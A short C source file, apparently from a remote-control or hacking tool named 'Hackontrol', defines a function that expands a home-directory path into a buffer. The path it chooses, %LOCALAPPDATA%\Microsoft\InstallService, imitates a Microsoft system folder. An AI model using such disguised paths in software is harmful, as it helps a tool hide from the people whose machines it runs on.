#include "hackontrol.h"

#define HACKONTROL_DIRECTORY L"%LOCALAPPDATA%\\Microsoft\\InstallService"

LPWSTR HackontrolGetHomeDirectory() {
	DWORD size = ExpandEnvironmentStringsW(HACKONTROL_DIRECTORY, NULL, 0);

	if(!size) {
		return NULL;
	}

	LPWSTR buffer = LocalAlloc(LMEM_FIXED, size * sizeof(WCHAR));

	if(!buffer) {
		return NULL;
	}

	if(!ExpandEnvironmentStringsW(HACKONTROL_DIRECTORY, buffer, size)) {
		DWORD error = GetLastError();
		LocalFree(buffer);
		SetLastError(error);
		return NULL;
	}

	SetLastError(ERROR_SUCCESS);
	return buffer;
}
